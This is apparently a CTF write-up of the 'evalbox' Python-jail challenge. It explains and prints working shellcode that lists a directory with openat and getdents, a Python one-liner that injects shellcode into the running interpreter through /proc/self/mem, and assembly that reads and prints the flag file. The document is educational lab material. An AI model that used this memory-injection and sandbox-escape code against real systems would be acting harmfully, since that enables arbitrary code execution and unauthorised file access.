---
title: "evalbox - pyjail writeup"
date: 2023-08-19
draft: false
tags: ["pyjail", "pwn", "ptr-yudai"]
---

This was a particularly unique and well-designed PyJail challenge featured in the Asian Cyber Security Challenge. Although I solved it during the contest using an unintended method.
<!--more-->
I later came across a writeup by ptr-yudai (an incredible pwner, someone I really aspire to be like!). Below are the notes I made while going through his insightful writeup.


## Part 1: Getting the Name of the File

In this challenge, we needed to find the file's name along with the full path, as the flag file had a randomized name.

### `openat` System Call:
The `openat` syscall allows us to open files within a directory by specifying the directory file descriptor and a relative path.

```c
int openat(int dirfd, const char *pathname, int flags);
```

- We set the path as `/home/ctf`, and `AT_FDCWD` is set in `dirfd` to indicate that the pathname is relative.
- `openat` syscall breakdown:
  - `rdi`: first argument - `AT_FDCWD` (`-100`).
  - `rsi`: pointer to the path (e.g., `/home/ctf`).
  - `rdx`: flags (set to `0` for read-only).
  - `rax`: syscall number (257).

### `getdents` System Call:
This syscall reads directory entries, such as filenames, from an open directory.

```c
int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
```

- It retrieves a series of `linux_dirent` structures, each containing metadata about files within the directory, like the inode number, offset, and filename.

```c
struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
    char           pad;       /* Zero padding byte */
    char           d_type;    /* File type (since Linux 2.6.4) */
};
```

- `getdents` syscall breakdown:
  - `rdi`: file descriptor returned by the `openat` syscall.
  - `rsi`: buffer (address of the directory entries).
  - `rdx`: buffer size (`0x1000`).
  - `rax`: syscall number (78).

### Recursive Code to Print Directory Entries:
The following code iterates through the `linux_dirent` structures, printing out each filename in the directory.

```asm
r15 = rax          ; number of bytes read.
r14 = 0            ; initialize index to 0.
edx = 0            ; reset edx.

lp:
    write(1, rsp + r14 + 18, 20)    ; print the filename.
    write(newline)                  ; add newline.

    dx = *(rsp + r14 + 16)          ; get the record length.
    add r14d, edx                   ; move to the next record.
    cmp r14, r15                    ; compare index with total bytes read.
    jl lp                           ; loop until all records are printed.

    exit()                          ; exit after printing all filenames.
```

This code loops through the directory entries and prints the filenames, allowing us to identify the randomly named flag file.

## Part 2: Injecting Shellcode via Memory Manipulation

The next step involves executing arbitrary code by injecting shellcode into memory using file descriptors mapped to the process's memory.

### Virtual Memory Manipulation:
We leverage the `/proc/` filesystem, which provides access to the kernel's view of the current process, including memory mappings and the process's memory itself.

- `/proc/self/maps`: Provides the memory mappings of the current process.
- `/proc/self/mem`: Allows direct access to the memory of the current process.

### Python Code for Shellcode Injection:

```python
code = f"""
all(map(
    lambda fs: [
        fs[1].seek(int(fs[0].read(12), 16) + 0x18ebb8, 0),
        fs[1].write({shellcode}),
        fs[1].flush(),
        input()
    ],
    [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")
```

### Breakdown:
1. **Get the memory mapping**: The code reads the first address from `/proc/self/maps`, which gives the base address of the memory region.
2. **Seek to a target offset**: It seeks to a specific offset (calculated as `0x18ebb8` from the base address), which is somewhere in the `_Py_read` function.
3. **Write shellcode**: The shellcode is injected into the memory at the calculated offset.
4. **Flush changes**: The memory is flushed to ensure that the shellcode is written.
5. **Trigger shell execution**: The shellcode gets executed when the process calls the read function.

## Part 3: Extracting the Flag
In the final part, the flag file can be accessed using standard file operations. Since the flag filename is randomized, the steps involve:
- **Opening the file**: Using the `open` syscall to open the flag file.
- **Reading the flag**: Reading the contents of the flag file.
- **Printing the flag**: Outputting the flag, which reveals the solution.

```bash
open("flag-[random-md5].txt", O_RDONLY)
read(fd, buffer, size)
write(1, buffer, size)
```

## Part 1 Assembly code
```asm
[BITS 64]
global main

section .text
main: 
	;openat(AT_FDCWD, "/", O_RDONLY)
	mov edx, 0
	lea rsi, [rel s_root]
	mov rdi, -100
	mov eax, 257
	syscall

	;getdents(fd, dirent, 0x1000)
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x1000
	mov rax, 78
	syscall

	mov r15, rax

	xor r14, r14
	xor edx, edx
	jmp rec 

rec:
	mov dx, [rsp+r14+16] ; rsp is our dirent
	sub edx, 20
	lea rsi, [rsp+r14+18]
	mov edi, 1
	mov eax, 1
	syscall

	mov edx, 1
	lea rsi, [rel s_newline]
	mov edi, 1
	mov eax, 1
	syscall

	mov dx, [rsp+r14+16]
	add r14d, edx
	cmp r14, r15
	jl rec

	xor edi, edi
	mov eax, 60
	syscall

section .data
	s_root: db "/home/ctf",0
	s_newline: db 0x0a
```

## Part 2 Assembly code
```asm
[BITS 64]
global main

section .text
main: 
    mov rax, 2
    lea rdi, [rel flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 100
    mov rax, 1
    syscall

section .data
    flag: db "/home/ctf/flag-0479f1dcda629bbe833598bce876a647.txt", 0 
```

By following this process, we can successfully extract the flag and complete the challenge.
